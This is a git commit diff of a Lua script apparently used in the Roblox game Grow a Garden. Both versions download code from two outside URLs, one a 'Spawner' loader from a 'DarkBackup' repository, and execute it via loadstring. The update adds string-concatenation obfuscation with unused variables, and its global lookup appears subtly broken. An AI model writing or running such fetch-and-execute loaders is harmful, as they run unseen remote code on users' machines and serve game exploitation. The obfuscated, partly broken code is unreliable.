9742cb52f60da70f5bed00fe298ac811e8e8f1f4
Ziadian <heeza9546@gmail.com>
2025-07-24 19:06:18 +0700

    Update growagardenscript.lua

--- growagardenscript.lua
+++ growagardenscript.lua
@@ -1,3 +1,9 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/PrgKkUmyirMQhNb1/raw", true))()
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
-Spawner.Load()
+local a = "h".."t".."t".."p"
+local b = "g".."a".."m".."e"
+local c = "H".."t".."t".."p".."G".."e".."t"
+
+local d = loadstring(_G[b]:HttpGet("https://api.rubis.app/v2/scrap/PrgKkUmyirMQhNb1/raw", true))
+d()
+
+local e = loadstring(_G[b]:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))
+e().Load()
